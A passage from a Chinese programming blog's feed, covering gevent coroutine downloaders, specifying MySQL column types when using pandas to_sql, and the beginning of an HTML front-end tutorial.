title="2.简单总结"></a>2.简单总结</h4><ol><li>进程是资源分配的单位</li><li>线程是操作系统调度的单位</li><li>进程切换需要的资源很最大，效率很低</li><li>线程切换需要的资源一般，效率一般（当然了在不考虑GIL的情况下）</li><li>协程切换任务资源很小，效率高</li><li>多进程、多线程根据cpu核数不一样可能是并行的，但是协程是在一个线程中 所以是并发</li></ol><h2 id="并发下载器"><a href="#并发下载器" class="headerlink" title="并发下载器"></a>并发下载器</h2><h3 id="1-并发下载原理"><a href="#1-并发下载原理" class="headerlink" title="1.并发下载原理"></a>1.并发下载原理</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有耗时操作时需要</span></span><br><span class="line">monkey.patch_all()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_downLoad</span><span class="params">(url)</span>:</span></span><br><span class="line">    print(<span class="string">'GET: %s'</span> % url)</span><br><span class="line">    resp = urllib.request.urlopen(url)</span><br><span class="line">    data = resp.read()</span><br><span class="line">    print(<span class="string">'%d bytes received from %s.'</span> % (len(data), url))</span><br><span class="line"></span><br><span class="line">gevent.joinall([</span><br><span class="line">        gevent.spawn(my_downLoad, <span class="string">'http://www.baidu.com/'</span>),</span><br><span class="line">        gevent.spawn(my_downLoad, <span class="string">'http://www.itcast.cn/'</span>),</span><br><span class="line">        gevent.spawn(my_downLoad, <span class="string">'http://www.itheima.com/'</span>),</span><br><span class="line">])</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET: http://www.baidu.com/</span><br><span class="line">GET: http://www.itcast.cn/</span><br><span class="line">GET: http://www.itheima.com/</span><br><span class="line"><span class="number">111327</span> bytes received <span class="keyword">from</span> http://www.baidu.com/.</span><br><span class="line"><span class="number">172054</span> bytes received <span class="keyword">from</span> http://www.itheima.com/.</span><br><span class="line"><span class="number">215035</span> bytes received <span class="keyword">from</span> http://www.itcast.cn/.</span><br></pre></td></tr></table></figure><p>从上能够看到是先发送的获取baidu的相关信息，然后依次是itcast、itheima，但是收到数据的先后顺序不一定与发送顺序相同，这也就体现出了异步，即不确定什么时候会收到数据，顺序不一定</p><h3 id="2-实现多个视频下载"><a href="#2-实现多个视频下载" class="headerlink" title="2.实现多个视频下载"></a>2.实现多个视频下载</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line"><span class="comment">#有IO才做时需要这一句</span></span><br><span class="line">monkey.patch_all()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_downLoad</span><span class="params">(file_name, url)</span>:</span></span><br><span class="line">    print(<span class="string">'GET: %s'</span> % url)</span><br><span class="line">    resp = urllib.request.urlopen(url)</span><br><span class="line">    data = resp.read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(file_name, <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(data)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'%d bytes received from %s.'</span> % (len(data), url))</span><br><span class="line"></span><br><span class="line">gevent.joinall([</span><br><span class="line">        gevent.spawn(my_downLoad, <span class="string">"1.mp4"</span>, <span class="string">'http://oo52bgdsl.bkt.clouddn.com/05day-08-%E3%80%90%E7%90%86%E8%A7%A3%E3%80%91%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89.mp4'</span>),</span><br><span class="line">        gevent.spawn(my_downLoad, <span class="string">"2.mp4"</span>, <span class="string">'http://oo52bgdsl.bkt.clouddn.com/05day-03-%E3%80%90%E6%8E%8C%E6%8F%A1%E3%80%91%E6%97%A0%E5%8F%82%E6%95%B0%E6%97%A0%E8%BF%94%E5%9B%9E%E5%80%BC%E5%87%BD%E6%95%B0%E7%9A%84%E5%AE%9A%E4%B9%89%E3%80%81%E8%B0%83%E7%94%A8%28%E4%B8%8B%29.mp4'</span>),</span><br><span class="line">])</span><br></pre></td></tr></table></figure><p>上面的url可以换为自己需要下载视频、音乐、图片等网址</p><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      &lt;!-- build time:Tue Dec 31 2019 14:31:59 GMT+0800 (GMT+08:00) --&gt;&lt;h1 id=&quot;迭代器&quot;&gt;&lt;a href=&quot;#迭代器&quot; class=&quot;headerlink&quot; title=&quot;迭代器&quot;&gt;&lt;/a&gt;迭代器&lt;/h1&gt;&lt;blockquote&gt;&lt;p&gt;迭代是访问集合元素的一种方式。迭代器是一个可以记住遍历的位置的对象。迭代器对象从集合的第一个元素开始访问，直到所有的元素被访问完结束。迭代器只能往前不会后退。&lt;/p&gt;&lt;/blockquote&gt;&lt;h2 id=&quot;1-可迭代对象&quot;&gt;&lt;a href=&quot;#1-可迭代对象&quot; class=&quot;headerlink&quot; title=&quot;1. 可迭代对象&quot;&gt;&lt;/a&gt;1. 可迭代对象&lt;/h2&gt;&lt;p&gt;我们已经知道可以对list、tuple、str等类型的数据使用for…in…的循环语法从其中依次拿到数据进行使用，我们把这样的过程称为遍历，也叫&lt;strong&gt;迭代&lt;/strong&gt;。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;但是，是否所有的数据类型都可以放到for…in…的语句中，然后让for…in…每次从中取出一条数据供我们使用，即供我们迭代吗？&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="https://yongnights.github.io/categories/Python/"/>
    
    
      <category term="Python" scheme="https://yongnights.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>在pandas.DataFrame.to_sql时指定数据库表的列类型</title>
    <link href="https://yongnights.github.io/2019/12/31/%E5%9C%A8pandas.DataFrame.to_sql%E6%97%B6%E6%8C%87%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E7%9A%84%E5%88%97%E7%B1%BB%E5%9E%8B/"/>
    <id>https://yongnights.github.io/2019/12/31/在pandas.DataFrame.to_sql时指定数据库表的列类型/</id>
    <published>2019-12-31T04:00:48.280Z</published>
    <updated>2019-12-31T04:00:48.281Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Tue Dec 31 2019 14:31:59 GMT+0800 (GMT+08:00) --><p>该文章转载自以下链接：<a href="https://www.jianshu.com/p/4c5e1ebe8470?utm_source=oschina-app" target="_blank" rel="noopener">https://www.jianshu.com/p/4c5e1ebe8470?utm_source=oschina-app</a></p><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>在数据分析并存储到数据库时，Python的Pandas包提供了to_sql 方法使存储的过程更为便捷，但如果在使用to_sql方法前不在数据库建好相对应的表，to_sql则会默认为你创建一个新表，这时新表的列类型可能并不是你期望的。例如我们通过下段代码往数据库中插入一部分数据：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame([[<span class="string">'a'</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2.0</span>, datetime.now(), <span class="literal">True</span>]], </span><br><span class="line">                  columns=[<span class="string">'str'</span>, <span class="string">'int'</span>, <span class="string">'float'</span>, <span class="string">'datetime'</span>, <span class="string">'boolean'</span>])</span><br><span class="line">print(df.dtypes)</span><br></pre></td></tr></table></figure><p></p><a id="more"></a><p>通过dtypes可知数据类型为object, int64, float64, datetime64[ns], bool 如果把数据通过to_sql方法插入到数据库中：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> create_engine</span><br><span class="line">engine = create_engine(<span class="string">"mysql+mysqldb://&#123;&#125;:&#123;&#125;@&#123;&#125;/&#123;&#125;"</span>.format(<span class="string">'username'</span>, <span class="string">'password'</span>, <span class="string">'host:port'</span>, <span class="string">'database'</span>))</span><br><span class="line">con = engine.connect()</span><br><span class="line"></span><br><span class="line">df.to_sql(name=<span class="string">'test'</span>, con=con, if_exists=<span class="string">'append'</span>, index=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p></p><p>用MySQL的desc可以发现数据库自动创建了表并默认指定了列的格式：<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在MySQL中查看表的列类型</span></span><br><span class="line">desc <span class="built_in">test</span>;</span><br></pre></td></tr></table></figure><p></p><table><thead><tr><th>Filed</th><th>Type</th><th>Null</th><th>Key</th><th>Default</th><th>Extra</th></tr></thead><tbody><tr><td>str</td><td>text</td><td>YES</td><td></td><td>NULL</td><td></td></tr><tr><td>int</td><td>bigint(20)</td><td>YES</td><td></td><td>NULL</td><td></td></tr><tr><td>float</td><td>double</td><td>YES</td><td></td><td>NULL</td><td></td></tr><tr><td>datetime</td><td>datetime</td><td>YES</td><td></td><td>NULL</td><td></td></tr><tr><td>boolean</td><td>tinyint(1)</td><td>YES</td><td></td><td>NULL</td></tr></tbody></table><p>其中str类型的数据在数据库表中被映射成text，int类型被映射成bigint(20)， float类型被映射成double类型。数据库中的列类型可能并非是我们所期望的格式，但我们又不想在数据插入前手动的创建数据库的表，而更希望根据DataFrame中数据的格式动态地改变数据库中表格式。</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>通过查阅pandas.DataFrame.to_sql的api文档[^footnote]，可以通过指定dtype 参数值来改变数据库中创建表的列类型。</p><blockquote><p>dtype : dict of column name to SQL type, default None<br>Optional specifying the datatype for columns. The SQL type should be a SQLAlchemy type, or a string for sqlite3 fallback connection.</p></blockquote><p>根据描述，可以在执行to_sql方法时，将映射好列名和指定类型的dict赋值给dtype参数即可上，其中对于MySQL表的列类型可以使用SQLAlchemy包中封装好的类型。<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 执行前先在MySQL中删除表</span></span><br><span class="line">drop table <span class="built_in">test</span>;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sqlalchemy.types <span class="keyword">import</span> NVARCHAR, Float, Integer</span><br><span class="line"></span><br><span class="line">dtypedict = &#123;</span><br><span class="line">  <span class="string">'str'</span>: NVARCHAR(length=<span class="number">255</span>),</span><br><span class="line">  <span class="string">'int'</span>: Integer(),</span><br><span class="line">  <span class="string">'float'</span> Float()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">df.to_sql(name=<span class="string">'test'</span>, con=con, if_exists=<span class="string">'append'</span>, index=<span class="literal">False</span>, dtype=dtypedict)</span><br></pre></td></tr></table></figure><p>更新代码后，再查看数据库，可以看到数据库在建表时会根据dtypedict中的列名来指定相应的类型。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在MySQL中查看表的列类型</span></span><br><span class="line">desc <span class="built_in">test</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th>Filed</th><th>Type</th><th>Null</th><th>Key</th><th>Default</th><th>Extra</th></tr></thead><tbody><tr><td>str</td><td>varchar(255)</td><td>YES</td><td></td><td>NULL</td><td></td></tr><tr><td>int</td><td>int(11)</td><td>YES</td><td></td><td>NULL</td><td></td></tr><tr><td>float</td><td>float</td><td>YES</td><td></td><td>NULL</td><td></td></tr><tr><td>datetime</td><td>datetime</td><td>YES</td><td></td><td>NULL</td><td></td></tr><tr><td>boolean</td><td>tinyint(1)</td><td>YES</td><td></td><td>NULL</td></tr></tbody></table><h1 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h1><p>通过分析，我们已经知道在执行to_sql的方法时，可以通过创建一个类似“{“column_name”：sqlalchemy_type}”的映射结构来控制数据库中表的列类型。但在实际使用时，我们更希望能通过pandas.DataFrame中的column的数据类型来映射数据库中的列类型，而不是每此都要列出pandas.DataFrame的column名字。<br>写一个简单的def将pandas.DataFrame中列名和预指定的类型映射起来即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mapping_df_types</span><span class="params">(df)</span>:</span></span><br><span class="line">    dtypedict = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> zip(df.columns, df.dtypes):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"object"</span> <span class="keyword">in</span> str(j):</span><br><span class="line">            dtypedict.update(&#123;i: NVARCHAR(length=<span class="number">255</span>)&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"float"</span> <span class="keyword">in</span> str(j):</span><br><span class="line">            dtypedict.update(&#123;i: Float(precision=<span class="number">2</span>, asdecimal=<span class="literal">True</span>)&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"int"</span> <span class="keyword">in</span> str(j):</span><br><span class="line">            dtypedict.update(&#123;i: Integer()&#125;)</span><br><span class="line">    <span class="keyword">return</span> dtypedict</span><br></pre></td></tr></table></figure><p>只要在执行to_sql前使用此方法获得一个映射dict再赋值给to_sql的dtype参数即可，执行的结果与上一节相同，不再累述。<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">df = pd.DataFrame([[<span class="string">'a'</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2.0</span>, datetime.now(), <span class="literal">True</span>]], </span><br><span class="line">                  columns=[<span class="string">'str'</span>, <span class="string">'int'</span>, <span class="string">'float'</span>, <span class="string">'datetime'</span>, <span class="string">'boolean'</span>])</span><br><span class="line">dtypedict = mapping_df_types(df)</span><br><span class="line">df.to_sql(name=<span class="string">'test'</span>, con=con, if_exists=<span class="string">'append'</span>, index=<span class="literal">False</span>, dtype=dtypedict)</span><br></pre></td></tr></table></figure><p></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol><li>[^footnote]<a href="https://link.jianshu.com/?t=https%3A%2F%2Fpandas.pydata.org%2Fpandas-docs%2Fstable%2Findex.html" target="_blank" rel="noopener">pandas官方文档</a></li></ol><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      &lt;!-- build time:Tue Dec 31 2019 14:31:59 GMT+0800 (GMT+08:00) --&gt;&lt;p&gt;该文章转载自以下链接：&lt;a href=&quot;https://www.jianshu.com/p/4c5e1ebe8470?utm_source=oschina-app&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.jianshu.com/p/4c5e1ebe8470?utm_source=oschina-app&lt;/a&gt;&lt;/p&gt;&lt;h1 id=&quot;问题&quot;&gt;&lt;a href=&quot;#问题&quot; class=&quot;headerlink&quot; title=&quot;问题&quot;&gt;&lt;/a&gt;问题&lt;/h1&gt;&lt;p&gt;在数据分析并存储到数据库时，Python的Pandas包提供了to_sql 方法使存储的过程更为便捷，但如果在使用to_sql方法前不在数据库建好相对应的表，to_sql则会默认为你创建一个新表，这时新表的列类型可能并不是你期望的。例如我们通过下段代码往数据库中插入一部分数据：&lt;br&gt;&lt;/p&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; pandas &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; pd&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; datetime &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; datetime&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;df = pd.DataFrame([[&lt;span class=&quot;string&quot;&gt;&#39;a&#39;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;2.0&lt;/span&gt;, datetime.now(), &lt;span class=&quot;literal&quot;&gt;True&lt;/span&gt;]], &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  columns=[&lt;span class=&quot;string&quot;&gt;&#39;str&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;int&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;float&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;datetime&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;boolean&#39;&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(df.dtypes)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="https://yongnights.github.io/categories/Python/"/>
    
    
      <category term="Python" scheme="https://yongnights.github.io/tags/Python/"/>
    
      <category term="pandas" scheme="https://yongnights.github.io/tags/pandas/"/>
    
  </entry>
  
  <entry>
    <title>前端知识汇总</title>
    <link href="https://yongnights.github.io/2019/12/31/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E6%B1%87%E6%80%BB/"/>
    <id>https://yongnights.github.io/2019/12/31/前端知识汇总/</id>
    <published>2019-12-31T04:00:48.279Z</published>
    <updated>2019-12-31T04:00:48.280Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Tue Dec 31 2019 14:32:00 GMT+0800 (GMT+08:00) --><h1 id="1-前端开发概述"><a href="#1-前端开发概述" class="headerlink" title="1. 前端开发概述"></a>1. 前端开发概述</h1><p>包括html、css、PC端及移动端布局技巧、javascript、jquery、js特效制作、ajax前后台交互等。</p><h2 id="1-1-什么是前端开发？"><a href="#1-1-什么是前端开发？" class="headerlink" title="1.1 什么是前端开发？"></a>1.1 什么是前端开发？</h2><p>前端开发也叫做web前端开发，它指的是基于web的互联网产品的页面(也可叫界面)开发及功能开发。</p><h2 id="1-2-什么互联网产品？"><a href="#1-2-什么互联网产品？" class="headerlink" title="1.2 什么互联网产品？"></a>1.2 什么互联网产品？</h2><p>互联网产品就是指网站为满足用户需求而创建的用于运营的功能及服务，百度搜索、淘宝、QQ、微博、网易邮箱等都是互联网产品。</p><h2 id="1-3-互联网产品开发流程及前端开发岗位？"><a href="#1-3-互联网产品开发流程及前端开发岗位？" class="headerlink" title="1.3 互联网产品开发流程及前端开发岗位？"></a>1.3 互联网产品开发流程及前端开发岗位？</h2><p><img src="/qianduan_images/001.jpg" alt></p><h2 id="1-4-前端开发需要哪些技术？"><a href="#1-4-前端开发需要哪些技术？" class="headerlink" title="1.4 前端开发需要哪些技术？"></a>1.4 前端开发需要哪些技术？</h2><p>前端工程师参照产品的效果图来开发页面(也可叫界面)，效果图是由UI设计师用Photoshop(少量设计师用firework)来设计的，为了方便与UI设计师对接工作，前端需要掌握一些Photoshop的技能，Photoshop还可以辅助页面开发。把效果图布局成页面，需要用到HTML语言和CSS语言，页面功能的开发需要用到javascript,为了快速开发和系统开发，还需要学习一些前端的javascript库和框架。</p><a id="more"></a><h1 id="2-HTML"><a href="#2-HTML" class="headerlink" title="2. HTML"></a>2. HTML</h1><h2 id="2-1-html概述和基本结构"><a href="#2-1-html概述和基本结构" class="headerlink" title="2.1 html概述和基本结构"></a>2.1 html概述和基本结构</h2><h3 id="2-1-1-html概述"><a href="#2-1-1-html概述" class="headerlink" title="2.1.1 html概述"></a>2.1.1 html概述</h3><p>HTML是 HyperText Mark-up Language 的首字母简写，意思是超文本标记语言，超文本指的是超链接，标记指的是标签，是一种用来制作网页的语言，这种语言由一个个的标签组成，用这种语言制作的文件保存的是一个文本文件，文件的扩展名为html或者htm，一个html文件就是一个网页，html文件用编辑器打开显示的是文本，可以用文本的方式编辑它，如果用浏览器打开，浏览器会按照标签描述内容将文件渲染成网页，显示的网页可以从一个网页链接跳转到另外一个网页。</p><h3 id="2-1-2-html基本结构"><a href="#2-1-2-html基本结构" class="headerlink" title="2.1.2 html基本结构"></a>2.1.2 html基本结构</h3><p>一个html的基本结构如下：<br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span>            </span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>网页标题<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">          网页显示内容</span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p></p><p>第一行是文档声明，第二行“</p><html>”标签和最后一行“</html>”定义html文档的整体，“<html>”标签中的‘lang=“en”’定义网页的语言为英文，定义成中文是’lang=”zh-CN”‘,不定义也没什么影响，它一般作为分析统计用。 “<head><meta name="generator" content="Hexo 3.9.0">”标签和“</head><body>”标签是它的第一层子元素，“<head><meta name="generator" content="Hexo 3.9.0">”标签里面负责对网页进行一些设置以及定义标题，设置包括定义网页的编码格式，外链css样式文件和javascript文件等，设置的内容不会显示在网页上，标题的内容会显示在标题，“</head><body>”内编写网页上显示的内容。</body><script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({log:!1,pluginJsPath:"lib/",pluginModelPath:"assets/",pluginRootPath:"live2dw/",tagMode:!1})</script></body></html><p></p><h3 id="2-1-3-HTML文档类型"><a href="#2-1-3-HTML文档类型" class="headerlink" title="2.1.3 HTML文档类型"></a>2.1.3 HTML文档类型</h3><p>目前常用的两种文档类型是xhtml 1.0和html5</p><h4 id="xhtml-1-0"><a href="#xhtml-1-0" class="headerlink" title="xhtml 1.0"></a>xhtml 1.0</h4><p>xhtml 1.0 是html5之前的一个常用的版本，目前许多网站仍然使用此版本。<br>此版本文档用sublime text创建方法： html:xt + tab<br>文档示例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span> <span class="attr">xml:lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html;charset=UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span> xhtml 1.0 文档类型 <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="html5"><a href="#html5" class="headerlink" title="html5"></a>html5</h4><p>pc端可以使用xhtml 1.0，也可以使用html5，html5是向下兼容的<br>此版本文档用sublime text创建方法： html:5 + tab 或者 ! + tab<br>文档示例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span> html5文档类型 <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="两种文档的区别"><a href="#两种文档的区别" class="headerlink" title="两种文档的区别"></a>两种文档的区别</h4><p>1、文档声明和编码声明<br>2、html5新增了标签元素以及元素属性</p><h4 id="html注释"><a href="#html注释" class="headerlink" title="html注释"></a>html注释</h4><p>html文档代码中可以插入注释，注释是对代码的说明和解释，注释的内容不会显示在页面上，html代码中插入注释的方法是：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 这是一段注释  --&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-2-html标题标签"><a href="#2-2-html标题标签" class="headerlink" title="2.2 html标题标签"></a>2.2 html标题标签</h2><p>通过 